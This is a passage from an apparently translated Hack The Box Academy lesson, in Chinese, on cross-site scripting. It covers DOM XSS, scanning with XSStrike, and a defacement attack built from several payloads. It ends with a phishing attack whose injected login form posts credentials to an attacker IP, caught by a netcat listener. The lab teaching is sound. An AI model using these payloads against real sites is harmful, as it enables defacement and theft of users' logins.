+<figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">"todo"</span>).<span class="property">innerHTML</span> = <span class="string">"&lt;b&gt;Next Task:&lt;/b&gt; "</span> + <span class="built_in">decodeURIComponent</span>(task);</span><br></pre></td></tr></tbody></table></figure>
+
+<p>因此，我们可以看到我们可以控制输入，而输出没有被清理，所以这个页面应该容易受到DOM XSS的攻击。</p>
+<h3 id="DOM-Attacks"><a href="#DOM-Attacks" class="headerlink" title="DOM Attacks"></a>DOM Attacks</h3><p>如果我们尝试之前使用的XSS有效负载，我们将看到它不会执行。这是因为<code>innerHTML</code>函数不允许将其中的<code>&lt;script&gt;</code>标记用作安全特性。尽管如此，我们使用的许多其他XSS有效负载不包含<code>&lt;script&gt;</code>标记，如以下XSS有效负载：</p>
+<p>Code: </p>
+<figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">""</span> <span class="attr">onerror</span>=<span class="string">alert(window.origin)</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>上面这行代码创建了一个新的HTML image对象，它有一个<code>onerror</code>属性，可以在找不到图像时执行JavaScript代码。因此，由于我们提供了一个空的image链接（<code>""</code>），我们的代码应该总是在不使用<code>&lt;script&gt;</code>标签的情况下执行：           </p>
+<p><img src="https://academy.hackthebox.com/storage/modules/103/xss_dom_alert.jpg" alt="img"></p>
+<p>要针对具有此DOM  XSS漏洞的用户，我们可以再次从浏览器复制URL并与他们共享，一旦他们访问它，JavaScript代码就应该执行。这两个负载都是最基本的XSS负载。在许多情况下，我们可能需要使用各种有效载荷，具体取决于Web应用程序和浏览器的安全性，我们将在下一节中讨论。</p>
+<h2 id="XSS-Discovery"><a href="#XSS-Discovery" class="headerlink" title="XSS Discovery"></a>XSS Discovery</h2><p>到目前为止，我们应该已经很好地理解了什么是XSS漏洞，XSS的三种类型，以及每种类型与其他类型的区别。我们还应该理解XSS是如何通过将JavaScript代码注入到客户端页面源代码中来工作的，从而执行额外的代码，我们稍后将学习如何利用这些代码。</p>
+<p>在本节中，我们将介绍检测Web应用程序中XSS漏洞的各种方法。在Web应用程序漏洞（以及一般的所有漏洞）中，检测它们可能变得与利用它们一样困难。然而，由于XSS漏洞普遍存在，许多工具可以帮助我们检测和识别它们。</p>
+<h3 id="自动发现"><a href="#自动发现" class="headerlink" title="自动发现"></a>自动发现</h3><p>几乎所有的Web应用程序漏洞扫描器（如<a target="_blank" rel="noopener" href="https://www.tenable.com/products/nessus">Nessus</a>，<a target="_blank" rel="noopener" href="https://portswigger.net/burp/pro">Burp Pro</a>或<a target="_blank" rel="noopener" href="https://owasp.org/www-project-zap/">ZAP</a>）都具有检测所有三种类型的XSS漏洞的各种功能。这些扫描器通常执行两种类型的扫描：被动扫描，检查客户端代码中潜在的基于DOM的漏洞;主动扫描，发送各种类型的有效负载，试图通过在页面源中注入有效负载来触发XSS。</p>
+<p>虽然付费工具通常在检测XSS漏洞方面具有更高的准确性（特别是在需要安全绕过时），但我们仍然可以找到开源工具来帮助我们识别潜在的XSS漏洞。这些工具通常通过识别网页中的输入字段，发送各种类型的XSS有效负载，然后比较呈现的页面源，看看是否可以在其中找到相同的有效负载，这可能表明XSS注入成功。但是，这并不总是准确的，因为有时候，即使注入了相同的负载，由于各种原因，它也可能不会导致成功执行，因此我们必须始终手动验证XSS注入。</p>
+<p>一些可以帮助我们发现XSS的常用开源工具是<a target="_blank" rel="noopener" href="https://github.com/s0md3v/XSStrike">XSS Strike</a>，<a target="_blank" rel="noopener" href="https://github.com/rajeshmajumdar/BruteXSS">Brute XSS</a>和<a target="_blank" rel="noopener" href="https://github.com/epsylon/xsser">XSSer</a>。我们可以尝试使用<code>XSS Strike</code>将其克隆到我们的VM：                                                      </p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ git clone https://github.com/s0md3v/XSStrike.git</span><br><span class="line">mikannse7@htb[/htb]$ cd XSStrike</span><br><span class="line">mikannse7@htb[/htb]$ pip install -r requirements.txt</span><br><span class="line">mikannse7@htb[/htb]$ python xsstrike.py</span><br><span class="line"></span><br><span class="line">XSStrike v3.1.4</span><br><span class="line">...SNIP...</span><br></pre></td></tr></tbody></table></figure>
+
+<p>然后，我们可以运行脚本，并使用<code>-u</code>为它提供一个带有参数的URL。让我们尝试使用它与我们的<code>Reflected XSS</code>例子从前面的部分：                                       </p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test" </span><br><span class="line"></span><br><span class="line">        XSStrike v3.1.4</span><br><span class="line"></span><br><span class="line">[~] Checking for DOM vulnerabilities </span><br><span class="line">[+] WAF Status: Offline </span><br><span class="line">[!] Testing parameter: task </span><br><span class="line">[!] Reflections found: 1 </span><br><span class="line">[~] Analysing reflections </span><br><span class="line">[~] Generating payloads </span><br><span class="line">[!] Payloads generated: 3072 </span><br><span class="line">------------------------------------------------------------</span><br><span class="line">[+] Payload: &lt;HtMl%09onPoIntERENTER+=+confirm()&gt; </span><br><span class="line">[!] Efficiency: 100 </span><br><span class="line">[!] Confidence: 10 </span><br><span class="line">[?] Would you like to continue scanning? [y/N]</span><br></pre></td></tr></tbody></table></figure>
+
+<p>正如我们所看到的，该工具从第一个有效负载中识别出易受XSS攻击的参数。<code>Try to verify the above payload by testing it on one of the previous  exercises. You may also try testing out the other tools and run them on  the same exercises to see how capable they are in detecting XSS  vulnerabilities.</code></p>
+<h3 id="手动发现"><a href="#手动发现" class="headerlink" title="手动发现"></a>手动发现</h3><p>当涉及到手动XSS发现时，发现XSS漏洞的难度取决于Web应用程序的安全级别。基本的XSS漏洞通常可以通过测试各种XSS有效负载来发现，但识别高级XSS漏洞需要高级代码审查技能。</p>
+<h4 id="XSS-Payloads-XSS有效载荷"><a href="#XSS-Payloads-XSS有效载荷" class="headerlink" title="XSS Payloads XSS有效载荷"></a>XSS Payloads XSS有效载荷</h4><p>查找XSS漏洞的最基本方法是针对给定网页中的输入字段手动测试各种XSS有效负载。我们可以在网上找到大量的XSS负载列表，比如[PayloadAllTheThings](<a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS</a> Injection/README.md)上的列表或者<a target="_blank" rel="noopener" href="https://github.com/payloadbox/xss-payload-list">PayloadBox</a>中的列表。然后，我们可以开始逐个测试这些负载，方法是复制每个负载并将其添加到我们的表单中，然后查看是否会弹出警告框。</p>
+<p>注意：XSS可以被注入到HTML页面中的任何输入中，这不仅限于HTML输入字段，还可以在HTTP头中，如Cookie或User-Agent（即，当它们的值显示在页面上时）。</p>
+<p>你会注意到，上面的大多数有效负载都不能在我们的示例Web应用程序中工作，即使我们正在处理最基本类型的XSS漏洞。这是因为这些有效负载是为各种各样的注入点编写的（比如在单引号后注入），或者是为了逃避某些安全措施（比如清理过滤器）而设计的。此外，这样的有效载荷利用各种注入向量来执行JavaScript代码，如基本的<code>&lt;script&gt;</code>标签、其他<code>HTML Attributes</code>如<code>&lt;img&gt;</code>或甚至<code>CSS Style</code>属性。这就是为什么我们可以预期这些有效负载中的许多负载不会在所有测试用例中工作，因为它们被设计为与某些类型的注入一起工作。</p>
+<p>这就是为什么手动复制/粘贴XSS有效负载效率不高的原因，因为即使Web应用程序存在漏洞，我们也可能需要一段时间来识别漏洞，特别是当我们有许多输入字段需要测试时。这就是为什么编写我们自己的Python脚本来自动发送这些有效负载，然后比较页面源以查看我们的有效负载是如何呈现的，这可能更有效。这可以帮助我们在高级情况下，XSS工具无法轻松发送和比较有效负载。通过这种方式，我们将有优势定制我们的工具，以我们的目标Web应用程序。但是，这是一种高级的XSS发现方法，不属于本模块的讨论范围。</p>
+<h1 id="XSS-Attacks-1"><a href="#XSS-Attacks-1" class="headerlink" title="XSS Attacks"></a>XSS Attacks</h1><h2 id="Defacing"><a href="#Defacing" class="headerlink" title="Defacing"></a>Defacing</h2><p>现在我们已经了解了不同类型的XSS和发现网页中XSS漏洞的各种方法，我们可以开始学习如何利用这些XSS漏洞。如前所述，XSS攻击的破坏和范围取决于XSS的类型，存储的XSS是最关键的，而基于DOM的则不那么重要。</p>
+<p>通常与存储的XSS漏洞一起使用的最常见的攻击之一是网站污损攻击。<code>Defacing</code>一个网站意味着为访问该网站的任何人改变其外观。黑客组织经常会破坏一个网站，声称他们已经成功地攻击了它，就像黑客<a target="_blank" rel="noopener" href="https://www.bbc.co.uk/news/technology-43812539">在2018年</a>破坏了英国国民健康服务（NHS）一样。这种攻击可能会引起媒体的强烈反响，并可能严重影响公司的投资和股价，特别是对银行和科技公司。</p>
+<p>虽然许多其他漏洞可以用来实现同样的事情，但存储的XSS漏洞是最常用的漏洞之一。</p>
+<h3 id="污损元素"><a href="#污损元素" class="headerlink" title="污损元素"></a>污损元素</h3><p>我们可以利用注入的JavaScript代码（通过XSS）使网页看起来像任何我们喜欢的方式。然而，污损网站通常用于发送简单的消息（即，我们成功地黑了你），所以给污损的网页一个美丽的外观并不是真正的主要目标。</p>
+<p>三个HTML元素通常用于更改网页的主要外观：</p>
+<ul>
+<li>Background Color <code>document.body.style.background</code> </li>
+<li>Background <code>document.body.background</code> </li>
+<li>Page Title <code>document.title</code> </li>
+<li>Page Text <code>DOM.innerHTML</code></li>
+</ul>
+<p>我们可以利用其中的两个或三个元素向网页写入基本消息，甚至删除易受攻击的元素，这样就很难快速重置网页，正如我们接下来将要看到的那样。</p>
+<h3 id="Changing-Background"><a href="#Changing-Background" class="headerlink" title="Changing Background"></a>Changing Background</h3><p>让我们回到我们的<code>Stored XSS</code>练习，并将其作为我们攻击的基础。您可以返回到<code>Stored XSS</code>部分以生成服务器并执行后续步骤。</p>
+<p>要更改网页的背景，我们可以选择特定的颜色或使用图像。我们将使用颜色作为背景，因为大多数污损攻击使用深色作为背景。为此，我们可以使用以下有效载荷：</p>
+<p>Code: </p>
+<figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">style</span>.<span class="property">background</span> = <span class="string">"#141d2b"</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>提示：在这里，我们将背景颜色设置为默认的Hack The Box背景颜色。我们可以使用任何其他十六进制值，或者可以使用命名颜色，如<code> = "black"</code>。</p>
+<p>我们将payload添加到<code>To-Do</code>列表中，我们将看到背景颜色发生了变化：                                                                                               </p>
+<p><img src="https://academy.hackthebox.com/storage/modules/103/xss_defacing_background_color.jpg" alt="img"></p>
+<p>这将持续通过页面刷新，并会出现在任何人谁访问该页面，因为我们正在利用一个存储的XSS漏洞。</p>
+<p>另一种选择是使用以下有效载荷将图像设置为背景：</p>
+<p>Code: </p>
+<figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">background</span> = <span class="string">"https://www.hackthebox.eu/images/logo-htb.svg"</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>尝试使用上面的payload，看看最终结果如何。</p>
+<h3 id="Changing-Page-Title"><a href="#Changing-Page-Title" class="headerlink" title="Changing Page Title"></a>Changing Page Title</h3><p>我们可以使用<code>2Do</code> JavaScript函数将页面标题从<code>document.title</code>更改为我们选择的任何标题：</p>
+<p>Code: </p>
+<figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">document</span>.<span class="property">title</span> = <span class="string">'HackTheBox Academy'</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>我们可以从页面窗口/选项卡中看到，我们的新标题已经取代了以前的标题：                                                                                                                                                                                      <img src="https://academy.hackthebox.com/storage/modules/103/xss_defacing_page_title.jpg" alt="img"></p>
+<h3 id="Changing-Page-Text"><a href="#Changing-Page-Text" class="headerlink" title="Changing Page Text"></a>Changing Page Text</h3><p>当我们想要改变网页上显示的文本时，我们可以利用各种JavaScript函数来实现。例如，我们可以使用<code>innerHTML</code>函数更改特定HTML元素/DOM的文本：</p>
+<p>Code:</p>
+<figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">"todo"</span>).<span class="property">innerHTML</span> = <span class="string">"New Text"</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>我们还可以利用jQuery函数来更有效地实现同样的事情，或者改变一行中多个元素的文本（要做到这一点，必须在页面源代码中导入<code>jQuery</code>库）：</p>
+<p>Code: </p>
+<figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line">$(<span class="string">"#todo"</span>).<span class="title function_">html</span>(<span class="string">'New Text'</span>);</span><br></pre></td></tr></tbody></table></figure>
+
+<p>这为我们提供了各种选项来自定义网页上的文本，并进行微调以满足我们的需求。然而，由于黑客组织通常会在网页上留下一条简单的消息，而不会留下任何其他信息，因此我们将使用<code>body</code>更改main <code>innerHTML</code>的整个HTML代码，如下所示：</p>
+<p>Code: </p>
+<figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">'body'</span>)[<span class="number">0</span>].<span class="property">innerHTML</span> = <span class="string">"New Text"</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>正如我们所看到的，我们可以用<code>body</code>指定<code>document.getElementsByTagName('body')</code>元素，通过指定<code>[0]</code>，我们选择了第一个<code>body</code>元素，这应该会改变整个网页的文本。我们也可以使用<code>jQuery</code>来实现同样的事情。但是，在发送我们的有效负载并进行永久更改之前，我们应该单独准备HTML代码，然后使用<code>innerHTML</code>将HTML代码设置为页面源代码。</p>
+<p>在我们的练习中，我们将借用<code>Hack The Box Academy</code>主页的HTML代码：</p>
+<p>Code: </p>
+<figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span> <span class="attr">style</span>=<span class="string">"color: white"</span>&gt;</span>Cyber Security Training<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">"color: white"</span>&gt;</span>by </span><br><span class="line">        <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"https://academy.hackthebox.com/images/logo-htb.svg"</span> <span class="attr">height</span>=<span class="string">"25px"</span> <span class="attr">alt</span>=<span class="string">"HTB Academy"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p><strong>提示：</strong>在我们提交到最终的有效负载之前，尝试在本地运行我们的HTML代码以查看它的外观并确保它按预期运行是明智的。</p>
+<p>我们将把HTML代码压缩成一行，并将其添加到前面的XSS负载中。最终有效载荷应如下：</p>
+<p>Code: </p>
+<figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml">document.getElementsByTagName('body')[0].innerHTML = '<span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">h1</span> <span class="attr">style</span>=<span class="string">"color: white"</span>&gt;</span>Cyber Security Training<span class="tag">&lt;/<span class="name">h1</span>&gt;</span><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">"color: white"</span>&gt;</span>by <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"https://academy.hackthebox.com/images/logo-htb.svg"</span> <span class="attr">height</span>=<span class="string">"25px"</span> <span class="attr">alt</span>=<span class="string">"HTB Academy"</span>&gt;</span> <span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span>'</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>一旦我们将有效负载添加到易受攻击的<code>To-Do</code>列表中，我们将看到我们的HTML代码现在永久地成为网页源代码的一部分，并向访问该页面的任何人显示我们的消息：                                                                                          </p>
+<p><img src="https://academy.hackthebox.com/storage/modules/103/xss_defacing_change_text.jpg" alt="img"></p>
+<p>通过使用三个XSS负载，我们能够成功地污损我们的目标网页。如果我们查看网页的源代码，我们会看到原始的源代码仍然存在，我们注入的有效负载出现在最后：</p>
+<p>Code:</p>
+<figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"list-unstyled"</span> <span class="attr">id</span>=<span class="string">"todo"</span>&gt;</span><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">style</span>.<span class="property">background</span> = <span class="string">"#141d2b"</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span><span class="tag">&lt;<span class="name">ul</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">document</span>.<span class="property">title</span> = <span class="string">'HackTheBox Academy'</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span><span class="tag">&lt;<span class="name">ul</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">'body'</span>)[<span class="number">0</span>].<span class="property">innerHTML</span> = <span class="string">'...SNIP...'</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>这是因为我们注入的JavaScript代码在执行时改变了页面的外观，在本例中，是在源代码的末尾。如果我们的注入是在源代码中间的一个元素中，那么其他脚本或元素可能会被添加到它之后，所以我们必须考虑它们以获得我们需要的最终外观。</p>
+<p>然而，对普通用户来说，页面看起来污损，并显示我们的新面貌。</p>
+<p>另一种非常常见的XSS攻击类型是网络钓鱼攻击。网络钓鱼攻击通常利用看似合法的信息来欺骗受害者将其敏感信息发送给攻击者。XSS网络钓鱼攻击的一种常见形式是通过注入虚假的登录表单，将登录详细信息发送到攻击者的服务器，然后可用于代表受害者登录并控制其帐户和敏感信息。</p>
+<h2 id="Phishing"><a href="#Phishing" class="headerlink" title="Phishing"></a>Phishing</h2><p>此外，假设我们要在特定组织的Web应用程序中识别XSS漏洞。在这种情况下，我们可以使用这种攻击作为网络钓鱼模拟练习，这也将帮助我们评估组织员工的安全意识，特别是如果他们信任易受攻击的Web应用程序，并且不希望它伤害他们。</p>
+<h3 id="XSS-Discovery-1"><a href="#XSS-Discovery-1" class="headerlink" title="XSS Discovery"></a>XSS Discovery</h3><p>我们首先尝试从本节末尾的服务器中查找Web应用程序<code>/phishing</code>中的XSS漏洞。当我们访问该网站时，我们看到它是一个简单的在线图像查看器，我们可以输入图像的URL，它会显示它：                                                            </p>
+<p><img src="https://academy.hackthebox.com/storage/modules/103/xss_phishing_image_viewer.jpg" alt="img"></p>
+<p>这种形式的图像查看器在在线论坛和类似的Web应用程序中很常见。由于我们可以控制URL，因此可以从使用基本的XSS负载开始。但是当我们尝试这个payload时，我们看到没有执行任何东西，我们得到了<code>dead image url</code>图标：                                                                                                                              </p>
+<p><img src="https://academy.hackthebox.com/storage/modules/103/xss_phishing_alert.jpg" alt="img"></p>
+<p>因此，我们必须运行我们之前学习的XSS发现过程来找到一个工作的XSS负载。<code>Before you continue, try to find an XSS payload that successfully executes JavaScript code on the page</code>.</p>
+<p>提示：要了解哪个有效负载应该工作，请尝试查看添加输入后输入在HTML源中的显示方式。</p>
+<h3 id="Login-Form-Injection"><a href="#Login-Form-Injection" class="headerlink" title="Login Form Injection"></a>Login Form Injection</h3><p>一旦我们确定了一个有效的XSS负载，我们就可以继续进行网络钓鱼攻击。要执行XSS网络钓鱼攻击，我们必须注入一个HTML代码，在目标页面上显示一个登录表单。这个表单应该将登录信息发送到我们正在监听的服务器，这样一旦用户尝试登录，我们就可以获得他们的凭据。</p>
+<p>我们可以很容易地找到基本登录表单的HTML代码，或者我们可以编写自己的登录表单。下面的示例应该显示一个登录表单：</p>
+<p>Code: </p>
+<figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>Please login to continue<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">http://OUR_IP</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"username"</span> <span class="attr">name</span>=<span class="string">"username"</span> <span class="attr">placeholder</span>=<span class="string">"Username"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">placeholder</span>=<span class="string">"Password"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Login"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>在上面的HTML代码中，<code>OUR_IP</code>是我们的VM的IP，我们可以在<code>ip a</code>下使用（<code>tun0</code>）命令找到它。我们稍后将侦听此IP以检索从表单发送的凭据。登录表单应如下所示：</p>
+<p>Code: </p>
+<figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>Please login to continue<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">placeholder</span>=<span class="string">"Username"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">placeholder</span>=<span class="string">"Password"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Login"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>接下来，我们应该准备XSS代码，并在易受攻击的表单上测试它。要将HTML代码写入易受攻击的页面，我们可以使用JavaScript函数<code>document.write()</code>，并在前面的XSS发现步骤中发现的XSS有效负载中使用它。一旦我们将HTML代码缩减为一行，并将其添加到<code>write</code>函数中，最终的JavaScript代码应该如下所示：</p>
+<p>Code: </p>
+<figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">'&lt;h3&gt;Please login to continue&lt;/h3&gt;&lt;form action=http://OUR_IP&gt;&lt;input type="username" name="username" placeholder="Username"&gt;&lt;input type="password" name="password" placeholder="Password"&gt;&lt;input type="submit" name="submit" value="Login"&gt;&lt;/form&gt;'</span>);</span><br></pre></td></tr></tbody></table></figure>
+
+<p>我们现在可以使用XSS有效负载注入这个JavaScript代码（即，而不是运行<code>alert(window.origin)</code> JavaScript代码）。在本例中，我们利用了一个<code>Reflected XSS</code>漏洞，因此我们可以复制URL及其参数中的XSS负载，正如我们在<code>Reflected XSS</code>部分中所做的那样，当我们访问恶意URL时，页面应该如下所示：                                                                                                                       </p>
+<p><img src="https://academy.hackthebox.com/storage/modules/103/xss_phishing_injected_login_form.jpg" alt="img"></p>
+<h3 id="Cleaning-Up"><a href="#Cleaning-Up" class="headerlink" title="Cleaning Up"></a>Cleaning Up</h3><p>我们可以看到URL字段仍然显示，这击败了我们的“<code>Please login to continue</code>“行。因此，为了鼓励受害者使用登录表单，我们应该删除URL字段，这样他们可能会认为他们必须登录才能使用该页面。为此，我们可以使用JavaScript函数<code>document.getElementById().remove()</code>函数。</p>
+<p>要找到我们想要删除的HTML元素的<code>id</code>，我们可以通过单击[<code>Page Inspector Picker</code>]打开<code>CTRL+SHIFT+C</code>，然后单击我们需要的元素： <img src="https://academy.hackthebox.com/storage/modules/103/xss_page_inspector_picker.jpg" alt="Page Inspector Picker"></p>
+<p>正如我们在源代码和悬停文本中看到的，<code>url</code>表单的id为<code>urlform</code>：</p>
+<p>Code: </p>
+<figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">role</span>=<span class="string">"form"</span> <span class="attr">action</span>=<span class="string">"index.php"</span> <span class="attr">method</span>=<span class="string">"GET"</span> <span class="attr">id</span>=<span class="string">'urlform'</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">placeholder</span>=<span class="string">"Image URL"</span> <span class="attr">name</span>=<span class="string">"url"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>所以，我们现在可以使用这个id和<code>remove()</code>函数来删除URL表单：</p>
+<p>Code: </p>
+<figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">'urlform'</span>).<span class="title function_">remove</span>();</span><br></pre></td></tr></tbody></table></figure>
+
+<p>现在，一旦我们将此代码添加到之前的JavaScript代码中（在<code>document.write</code>函数之后），我们就可以在负载中使用此新的JavaScript代码：</p>
+<p>Code: </p>
+<figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">'&lt;h3&gt;Please login to continue&lt;/h3&gt;&lt;form action=http://OUR_IP&gt;&lt;input type="username" name="username" placeholder="Username"&gt;&lt;input type="password" name="password" placeholder="Password"&gt;&lt;input type="submit" name="submit" value="Login"&gt;&lt;/form&gt;'</span>);<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">'urlform'</span>).<span class="title function_">remove</span>();</span><br></pre></td></tr></tbody></table></figure>
+
+<p>当我们尝试注入更新的JavaScript代码时，我们看到URL表单确实不再显示：                                                                                                              </p>
+<p><img src="https://academy.hackthebox.com/storage/modules/103/xss_phishing_injected_login_form_2.jpg" alt="img"></p>
+<p>我们还可以看到，在注入登录表单之后，仍有一段原始HTML代码。这可以通过简单的注释来删除，通过在我们的XSS有效负载之后添加HTML开始注释：</p>
+<p>Code: </p>
+<figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line">...PAYLOAD... <span class="comment">&lt;!-- </span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>正如我们所看到的，这删除了原始HTML代码的剩余部分，我们的有效负载应该已经准备好了。页面现在看起来像是需要登录：<img src="https://academy.hackthebox.com/storage/modules/103/xss_phishing_injected_login_form_3.jpg" alt="img"></p>
+<p>我们现在可以复制最终的URL，它应该包括整个有效载荷，我们可以将其发送给受害者，并尝试欺骗他们使用虚假的登录表单。您可以尝试访问该URL，以确保它将按预期显示登录表单。也尝试登录到上面的登录表单，看看会发生什么。</p>
+<h3 id="Credential-Stealing"><a href="#Credential-Stealing" class="headerlink" title="Credential Stealing"></a>Credential Stealing</h3><p>最后，当受害者试图登录我们注入的登录表单时，我们会窃取登录凭据。如果您尝试登录到注入的登录表单，您可能会得到错误<code>This site can’t be reached</code>。这是因为，如前所述，我们的HTML表单被设计为将登录请求发送到我们的IP，该IP应该正在侦听连接。如果我们没有监听连接，我们会得到一个<code>site can’t be reached</code>错误。</p>
+<p>因此，让我们启动一个简单的<code>netcat</code>服务器，看看当有人试图通过表单登录时，我们会收到什么样的请求。为此，我们可以在Pwnbox中的端口80上开始侦听，如下所示：       </p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ sudo nc -lvnp 80</span><br><span class="line">listening on [any] 80 ...</span><br></pre></td></tr></tbody></table></figure>
+
+<p>现在，让我们尝试使用凭据<code>test:test</code>登录，并检查我们得到的<code>netcat</code>输出（<code>don't forget to replace OUR_IP in the XSS payload with your actual IP</code>）：                              </p>
